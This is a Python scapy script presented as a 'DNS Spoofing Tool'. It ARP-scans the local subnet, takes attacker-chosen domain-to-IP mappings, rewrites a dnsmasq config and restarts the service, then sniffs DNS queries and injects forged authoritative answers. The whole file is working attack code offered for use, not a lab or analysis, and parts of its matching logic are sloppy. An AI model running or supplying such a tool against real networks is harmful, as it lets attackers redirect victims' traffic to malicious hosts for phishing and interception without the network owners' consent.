import argparse
import os
from scapy.all import *
import netifaces as ni

def process_dns_packet(packet, spoofed_domains):
    if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
        # Check if it's a DNS query and not a response
        dns_query = packet[DNSQR]
        domain = str(dns_query.qname).lower().rstrip(".")

        if domain in str(spoofed_domains.keys()):
            spoofed_ip = spoofed_domains[domain]

            # Modify the DNS response
            spoofed_response = DNSRR(
                rrname=dns_query.qname,
                ttl=10,
                rdata=spoofed_ip.encode()  # Encode spoofed IP address
            )
            print("Spoofed domain: {}".format(domain))
            print("Spoofed IP address: {}".format(spoofed_ip))

            # Build and send the spoofed DNS response
            dns_response = IP(dst=packet[IP].src) / UDP(dport=packet[UDP].sport) / \
                           DNS(id=packet[DNS].id, qr=1, aa=1, qd=dns_query, an=spoofed_response)
            send(dns_response, verbose=0)

def add_to_dnsmasq_config(spoofed_domains):
    config_file = "/etc/dnsmasq.d/spoofing.conf"

    # Empty the file by overwriting it
    with open(config_file, "w") as f:
        pass

    with open(config_file, "a") as f:
        for domain, ip in spoofed_domains.items():
            f.write("address=/{0}/{1}\n".format(domain, ip))

def prompt_user_input():
    spoofed_domains = {}

    while True:
        domain = raw_input("Enter the domain to spoof (or 's' to start): ")
        if domain == 's':
            break

        ip = raw_input("Enter the IP address to redirect to: ")
        spoofed_domains[domain.lower()] = ip

    return spoofed_domains

def start_dns_spoofing(interface, spoofed_domains):
    # Define a filter expression to capture DNS traffic (UDP packets on port 53)
    filter_expression = "udp and dst port 53"

    # Start packet capture and DNS spoofing
    sniff(filter=filter_expression, iface=interface, prn=lambda pkt: process_dns_packet(pkt, spoofed_domains))

def get_local_ip(interface):
    try:
        return ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
    except ValueError:
        return None

def scan_ips(interface):
    local_ip = get_local_ip(interface)
    if local_ip:
        network = local_ip + "/24"
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=2, verbose=False, iface=interface)
        return [res[1].psrc for _, res in ans]
    else:
        return []


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Spoofing Tool")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to capture packets")
    args = parser.parse_args()

    interface = args.interface

    print("[+] Scanning available IP addresses...")
    ips = scan_ips(interface)
    print("[+] Available IP addresses:")
    for ip in ips:
        print(ip)

    spoofed_domains = prompt_user_input()

    try:
        print("[+] Adding domains to dnsmasq configuration...")
        add_to_dnsmasq_config(spoofed_domains)
        print("[+] Restarting dnsmasq service...")
        os.system("service dnsmasq start")
        os.system("service dnsmasq restart")
        print("[+] Starting DNS spoofing...")
        start_dns_spoofing(args.interface, spoofed_domains)
    except KeyboardInterrupt:
        print("\n[+] Stopping DNS spoofing...")
